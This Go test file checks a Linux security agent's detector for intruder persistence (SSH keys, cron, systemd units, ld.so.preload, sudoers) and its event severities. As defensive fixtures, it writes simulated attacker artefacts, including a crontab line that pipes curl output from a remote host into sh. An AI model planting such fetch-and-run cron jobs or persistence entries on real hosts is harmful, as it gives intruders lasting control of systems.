//go:build linux

package system

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/yominsops/yomins-agent/internal/events"
)

func write(t *testing.T, root, p, body string) {
	t.Helper()
	full := filepath.Join(root, p)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

func changesOf(cs []fileChange, root string) map[string]string {
	m := map[string]string{}
	for _, c := range cs {
		rel, _ := filepath.Rel(root, c.path)
		m["/"+rel] = c.spec.Kind + " " + c.change
	}
	return m
}

func TestScanPersistence(t *testing.T) {
	root := t.TempDir()
	write(t, root, "root/.ssh/authorized_keys", "ssh-ed25519 AAAA admin\n")
	write(t, root, "etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
	write(t, root, "etc/sudoers.d/admins", "%admins ALL=(ALL) ALL\n")
	var st watchState

	// The first scan records what is there and reports nothing.
	if cs := scanPersistence(root, persistenceSpecs, &st); len(cs) != 0 {
		t.Fatalf("baseline reported %v", changesOf(cs, root))
	}
	if cs := scanPersistence(root, persistenceSpecs, &st); len(cs) != 0 {
		t.Fatalf("nothing changed, got %v", changesOf(cs, root))
	}

	// An intruder adds a key, a cron job and a unit, and drops a sudoers file.
	write(t, root, "root/.ssh/authorized_keys", "ssh-ed25519 AAAA admin\nssh-rsa BBBB intruder\n")
	write(t, root, "home/www/.ssh/authorized_keys", "ssh-rsa BBBB intruder\n")
	write(t, root, "var/spool/cron/crontabs/www", "* * * * * curl -s http://x | sh\n")
	write(t, root, "etc/systemd/system/kworker.service", "[Service]\nExecStart=/tmp/k\n")
	write(t, root, "etc/ld.so.preload", "/lib/libhide.so\n")
	if err := os.Remove(filepath.Join(root, "etc/sudoers.d/admins")); err != nil {
		t.Fatal(err)
	}
	got := changesOf(scanPersistence(root, persistenceSpecs, &st), root)
	want := map[string]string{
		"/root/.ssh/authorized_keys":          "authorized_keys modified",
		"/home/www/.ssh/authorized_keys":      "authorized_keys added",
		"/var/spool/cron/crontabs/www":        "cron added",
		"/etc/systemd/system/kworker.service": "systemd_unit added",
		"/etc/ld.so.preload":                  "ld_preload added",
		"/etc/sudoers.d/admins":               "sudoers removed",
	}
	if len(got) != len(want) {
		t.Fatalf("got %v", got)
	}
	for p, w := range want {
		if got[p] != w {
			t.Errorf("%s: got %q, want %q", p, got[p], w)
		}
	}
}

// A spec added by an upgrade starts with a baseline, so an upgrade does not
// report every crontab on the host as new.
func TestScanPersistence_NewSpecBaselines(t *testing.T) {
	root := t.TempDir()
	write(t, root, "etc/crontab", "x\n")
	write(t, root, "etc/profile.d/a.sh", "x\n")
	var st watchState
	scanPersistence(root, persistenceSpecs[:4], &st) // an older agent knew fewer specs
	if cs := scanPersistence(root, persistenceSpecs, &st); len(cs) != 0 {
		t.Fatalf("new specs reported %v", changesOf(cs, root))
	}
}

func TestChangeEvent(t *testing.T) {
	c := NewCollector(Config{})
	root := "/fake"
	spec := persistenceSpecs[3] // authorized_keys
	ev := c.changeEvent(fileChange{spec, "/fake/home/www/.ssh/authorized_keys", "added"}, time.Now(), root)
	if ev.Type != events.EventSystemPersistence || ev.Context.Reason != "/home/www/.ssh/authorized_keys" || ev.Actor.User != "www" || ev.Severity != events.SeverityCritical {
		t.Errorf("%+v %+v", ev, ev.Actor)
	}
	ev = c.changeEvent(fileChange{persistenceSpecs[0], "/fake/etc/sudoers.d/x", "modified"}, time.Now(), root)
	if ev.Type != events.EventSystemConfigModified || ev.Tags[1] != "config_modified" || ev.Tags[2] != "sudoers" || ev.Tags[3] != "modified" {
		t.Errorf("%+v", ev)
	}
}

func TestChangeEvent_DuringPackageUpdate(t *testing.T) {
	root := t.TempDir()
	write(t, root, "var/lib/dpkg/status", "x")
	c := NewCollector(Config{})
	ev := c.changeEvent(fileChange{persistenceSpecs[2], filepath.Join(root, "etc/pam.d/sshd"), "modified"}, time.Now(), root)
	if ev.Severity != events.SeverityInfo || ev.Tags[len(ev.Tags)-1] != "package_manager" {
		t.Errorf("%+v", ev)
	}
	old := time.Now().Add(-time.Hour)
	if err := os.Chtimes(filepath.Join(root, "var/lib/dpkg/status"), old, old); err != nil {
		t.Fatal(err)
	}
	ev = c.changeEvent(fileChange{persistenceSpecs[2], filepath.Join(root, "etc/pam.d/sshd"), "modified"}, time.Now(), root)
	if ev.Severity != events.SeverityCritical {
		t.Errorf("an hour after the last package change: %+v", ev)
	}
}
